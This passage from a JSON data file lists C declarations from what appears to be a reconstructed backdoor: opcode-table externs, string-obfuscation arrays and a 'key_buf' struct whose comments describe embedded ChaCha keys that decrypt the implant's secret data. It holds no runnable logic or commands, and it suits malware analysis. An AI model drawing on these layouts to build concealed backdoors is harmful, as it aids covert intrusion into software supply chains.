        "tls_get_addr_reloc_consts"
      ],
      "code": "extern const backdoor_tls_get_addr_reloc_consts_t tls_get_addr_reloc_consts;"
    },
    {
      "kind": "declaration",
      "names": [
        "dasm_threebyte_has_modrm"
      ],
      "code": "extern const u8 dasm_threebyte_has_modrm[32];"
    },
    {
      "kind": "declaration",
      "names": [
        "dasm_threebyte_0x38_is_valid"
      ],
      "code": "extern const u8 dasm_threebyte_0x38_is_valid[32];"
    },
    {
      "kind": "declaration",
      "names": [
        "dasm_twobyte_has_modrm"
      ],
      "code": "extern const u8 dasm_twobyte_has_modrm[32];"
    },
    {
      "kind": "declaration",
      "names": [
        "dasm_twobyte_is_valid"
      ],
      "code": "extern const u8 dasm_twobyte_is_valid[32];"
    },
    {
      "kind": "declaration",
      "names": [
        "dasm_onebyte_has_modrm"
      ],
      "code": "extern const u8 dasm_onebyte_has_modrm[32];"
    },
    {
      "kind": "declaration",
      "names": [
        "dasm_onebyte_is_invalid"
      ],
      "code": "extern const u8 dasm_onebyte_is_invalid[32];"
    },
    {
      "kind": "struct",
      "names": [
        "key_buf"
      ],
      "code": "typedef struct __attribute__((packed)) key_buf {\n u8 seed_key[0x20]; /* ChaCha key baked into the binary; decrypts the 0x30-byte seed blob. */\n u8 seed_iv[0x10]; /* Static ChaCha nonce/counter paired with seed_key. */\n u8 encrypted_seed[0x30]; /* Ciphertext that yields the runtime ChaCha key once decrypted. */\n u8 payload_iv[0x10]; /* Fixed nonce used when decrypting ctx->encrypted_secret_data. */\n} key_buf;"
    },
    {
      "kind": "declaration",
      "names": [
        "string_mask_data"
      ],
      "code": "extern const u64 string_mask_data[238];"
    },
    {
      "kind": "declaration",
      "names": [
        "string_action_data"
      ],
      "code": "extern const u32 string_action_data[1304];"
    }
  ]
}
